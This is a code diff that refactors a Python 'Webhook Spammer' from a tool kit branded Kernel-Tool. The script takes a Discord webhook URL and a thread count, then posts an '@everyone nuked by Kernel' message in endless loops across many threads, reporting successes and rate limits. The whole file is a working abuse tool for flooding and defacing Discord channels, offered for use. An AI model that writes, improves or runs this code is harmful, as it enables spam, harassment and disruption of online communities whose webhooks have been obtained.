@@ -1,12 +1,15 @@
 # Copyright (c) Kernel-Tool
 # See the file 'LICENSE' for copying permission
-# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
+# ------------------------------------------------------------------------------------------------
 # EN:
-#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
+#     - Do not touch or modify the code below. If there is an error, please contact the owner,
+#       but under no circumstances should you touch the code.
 #     - Do not resell this tool, do not credit it to yours.
 # FR:
-#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
+#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le
+#       propriétaire, mais en aucun cas vous ne devez toucher au code.
 #     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
+# ------------------------------------------------------------------------------------------------
 
 from Config.Util import *
 from Config.Config import *
@@ -18,81 +21,86 @@ try:
 except Exception as e:
     ErrorModule(e)
 
+Reset()
+print(webhook_spammer_banner)
 Title("Webhook Spammer")
 
-# Fixed message
 NUKE_MESSAGE = "# @everyone nuked by Kernel https://guns.lol/2437"
+KERNEL_LOGO_URL = None
 
-# KERNEL logo image URL (change if you want)
-KERNEL_LOGO_URL = None   # Example: "https://i.imgur.com/yourimage.png"
-
-try:
-    print(f"{BEFORE + AFTER} {INFO} This tool will spam a Discord webhook with a fixed message.{green}")
-
-    webhook_url = input(f"{BEFORE + AFTER} {INPUT} Webhook URL -> {reset}").strip()
-
-    if not webhook_url:
-        print(f"{BEFORE + AFTER} {ERROR} No webhook URL provided.{red}")
-        Continue()
-        Reset()
-
-    if not CheckWebhook(webhook_url):
-        print(f"{BEFORE + AFTER} {ERROR} Invalid webhook URL format.{red}")
-        Continue()
-        Reset()
-
+def main():
     try:
-        threads_number = int(input(f"{BEFORE + AFTER} {INPUT} Threads Number -> {reset}"))
-        if threads_number < 1:
-            threads_number = 1
-    except:
-        ErrorNumber()
-        Reset()
+        print(f"{LC}{current_time_hour()} {INFO} This tool will spam a Discord webhook with a fixed message.{RS}")
 
-    def send_webhook(webhook_url_to_use):
-        headers = {'Content-Type': 'application/json'}
-        payload = {
-            'content': NUKE_MESSAGE,
-            'username': 'KERNEL'
-        }
-        if KERNEL_LOGO_URL and isinstance(KERNEL_LOGO_URL, str) and KERNEL_LOGO_URL.startswith('http'):
-            payload['avatar_url'] = KERNEL_LOGO_URL
+        webhook_url = input(f"{LC}{current_time_hour()} {INPUT} Webhook URL -> {RS}").strip()
+
+        if not webhook_url:
+            print(f"{LC}{current_time_hour()} {ERROR} No webhook URL provided.{RS}")
+            Continue()
+            Reset()
+            return
+
+        if not CheckWebhook(webhook_url):
+            print(f"{LC}{current_time_hour()} {ERROR} Invalid webhook URL format.{RS}")
+            Continue()
+            Reset()
+            return
 
         try:
-            response = requests.post(webhook_url_to_use, headers=headers, data=json.dumps(payload))
-            if response.status_code == 204:
-                print(f"{BEFORE_GREEN + AFTER_GREEN} {GEN_VALID} Message sent successfully{green}")
-            elif response.status_code == 429:
-                print(f"{BEFORE + AFTER} {GEN_INVALID} Rate Limited{red}")
-            else:
-                print(f"{BEFORE + AFTER} {GEN_INVALID} Status: {white}{response.status_code}{red}")
+            threads_number = int(input(f"{LC}{current_time_hour()} {INPUT} Threads Number -> {RS}"))
+            if threads_number < 1:
+                threads_number = 1
+        except:
+            ErrorNumber()
+            Reset()
+            return
+
+        def send_webhook(webhook_url_to_use):
+            headers = {'Content-Type': 'application/json'}
+            payload = {
+                'content': NUKE_MESSAGE,
+                'username': 'KERNEL'
+            }
+            if KERNEL_LOGO_URL and isinstance(KERNEL_LOGO_URL, str) and KERNEL_LOGO_URL.startswith('http'):
+                payload['avatar_url'] = KERNEL_LOGO_URL
+
+            try:
+                response = requests.post(webhook_url_to_use, headers=headers, data=json.dumps(payload))
+                if response.status_code == 204:
+                    print(f"{LC}{current_time_hour()} {GEN_VALID} Message sent successfully{RS}")
+                elif response.status_code == 429:
+                    print(f"{LC}{current_time_hour()} {GEN_INVALID} Rate Limited{RS}")
+                else:
+                    print(f"{LC}{current_time_hour()} {GEN_INVALID} Status: {response.status_code}{RS}")
+            except Exception as e:
+                print(f"{LC}{current_time_hour()} {GEN_INVALID} Error: {str(e)[:50]}{RS}")
+
+        def spam_webhook():
+            while True:
+                send_webhook(webhook_url)
+
+        print(f"{LC}{current_time_hour()} {WAIT} Starting spam with {threads_number} threads...{RS}")
+        print(f"{LC}{current_time_hour()} {INFO} Message: {NUKE_MESSAGE}{RS}")
+
+        def run_threads():
+            threads = []
+            for _ in range(threads_number):
+                t = threading.Thread(target=spam_webhook, daemon=True)
+                t.start()
+                threads.append(t)
+            for thread in threads:
+                thread.join()
+
+        try:
+            run_threads()
+        except KeyboardInterrupt:
+            print(f"{LC}{current_time_hour()} {INFO} Stopping spam...{RS}")
+            Continue()
+            Reset()
         except Exception as e:
-            print(f"{BEFORE + AFTER} {GEN_INVALID} Error: {white}{str(e)[:50]}{red}")
+            Error(e)
 
-    def spam_webhook():
-        while True:
-            send_webhook(webhook_url)
-
-    print(f"{BEFORE + AFTER} {WAIT} Starting spam with {white}{threads_number}{green} threads...{green}")
-    print(f"{BEFORE + AFTER} {INFO} Message: {white}{NUKE_MESSAGE}{green}")
-
-    def run_threads():
-        threads = []
-        for _ in range(threads_number):
-            t = threading.Thread(target=spam_webhook, daemon=True)
-            t.start()
-            threads.append(t)
-        for thread in threads:
-            thread.join()
-
-    try:
-        run_threads()
-    except KeyboardInterrupt:
-        print(f"{BEFORE + AFTER} {INFO} Stopping spam...{green}")
-        Continue()
-        Reset()
     except Exception as e:
         Error(e)
 
-except Exception as e:
-    Error(e)
+main()
